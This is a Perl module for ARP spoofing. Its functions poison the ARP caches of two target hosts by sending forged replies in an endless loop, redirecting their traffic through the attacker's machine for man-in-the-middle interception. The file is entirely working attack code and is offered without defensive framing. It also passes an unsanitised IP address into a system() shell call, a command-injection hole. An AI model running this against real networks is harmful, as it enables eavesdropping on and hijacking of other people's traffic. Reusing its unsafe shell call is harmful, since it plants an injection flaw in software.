package net::arp::nh_arp;
use Net::ARP;
use net::ipv4::nh_ip;
require Exporter;

@ISA = qw(Exporter);
@EXPORT = qw(
                nh_arp_spoof nh_arp_update_cache nh_arp_hijack 
             );

my $nh_arp_request = "request";           
my $nh_arp_reply = "reply";           
my $nh_arp_request_broadcast = "FF:FF:FF:FF:FF:FF";

sub nh_arp_send_reply {
    my $if = shift(@_);
    my $smac = shift(@_);
    my $dmac1 = shift(@_);
    my $dmac2 = shift(@_);
    my $dip1 = shift(@_);
    my $dip2 = shift(@_);

    Net::ARP::send_packet($if,          # Device
        $dip1,                          # Source IP
        $dip2,                          # Destination IP
        $smac,                          # Source MAC
        $dmac2,                         # Destinaton MAC
        $nh_arp_reply);                 # ARP operation

    Net::ARP::send_packet($if,
        $dip2,
        $dip1,
        $smac, 
        $dmac1,
        $nh_arp_reply); 
}            

sub nh_arp_update_cache {
    my $dip = shift(@_);

    system("ping -c 1 $dip >/dev/null");
}

sub nh_arp_hijack {
    my $it = shift(@_);
    my $if = shift(@_);
    my $dip1 = shift(@_);
    my $dip2 = shift(@_);
    my $smac;
    my $dmac1;
    my $dmac2;
 
    $smac = Net::ARP::get_mac($if);
    while (1) {
        $dmac1 = Net::ARP::arp_lookup($if, $dip1);
        if ($dmac1 eq "unknown") {
            die("Get mac of $dip1 failed!\n");
        }
        $dmac2 = Net::ARP::arp_lookup($if, $dip2);
        if ($dmac2 eq "unknown") {
            die("Get mac of $dip2 failed!\n");
        }
        &nh_arp_send_reply($if, $smac, $dmac1, $dmac2, $dip1, $dip2); 
        print("$dip1\[$smac\] -> $dip2\[$dmac2\] and $dip2\[$smac\] -> $dip2\[$dmac1\]\n");
        sleep($it);
    }
}

sub nh_arp_spoof {
    my $it = shift(@_);
    my $if = shift(@_);
    my $dip1 = shift(@_);
    my $dip2 = shift(@_);

    &nh_arp_update_cache($dip1);
    &nh_arp_update_cache($dip2);
    &nh_arp_hijack($it, $if, $dip1, $dip2);
}

1;
